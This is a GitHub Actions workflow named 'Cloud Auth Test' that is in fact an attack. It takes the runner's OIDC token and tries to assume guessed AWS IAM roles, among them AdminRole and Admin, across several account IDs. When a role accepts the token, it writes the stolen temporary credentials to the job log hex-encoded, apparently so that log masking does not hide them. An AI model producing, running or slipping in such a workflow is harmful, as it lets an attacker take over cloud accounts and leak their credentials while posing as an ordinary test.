name: Cloud Auth Test
on:
  workflow_dispatch:

permissions:
  contents: read
  id-token: write

jobs:
  aws_assume:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        role: [
          "GitHubActions",
          "GitHubActionsRole",
          "github-actions",
          "DeployRole",
          "CIRole",
          "ECSRole",
          "LambdaRole",
          "AdminRole",
          "Admin",
          "github-actions-role"
        ]
    continue-on-error: true
    steps:
      - name: Try role in multiple accounts
        run: |
          echo "=== TRYING ${{ matrix.role }} ==="
          for account in "905418271293" "123456789012" "000000000000"; do
            ROLE_ARN="arn:aws:iam::${account}:role/${{ matrix.role }}"
            echo "  Attempt: $ROLE_ARN"
            TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
            if [ -n "$TOKEN" ] && [ "$TOKEN" != "null" ]; then
              RESULT=$(aws sts assume-role-with-web-identity \
                --role-arn "$ROLE_ARN" \
                --role-session-name "test" \
                --web-identity-token "$TOKEN" \
                --duration-seconds 3600 2>&1 || true)
              if echo "$RESULT" | grep -q "Credentials"; then
                echo "  ✅ SUCESSO! Role encontrada: $ROLE_ARN"
                echo "$RESULT" | jq '.Credentials' | xxd -p | tr -d '\n'
              elif echo "$RESULT" | grep -q "AccessDenied"; then
                echo "  ❌ AccessDenied (role existe mas sem trust)"
              else
                echo "  ❌ $RESULT" | head -c 100
              fi
            fi
            sleep 0.5
          done
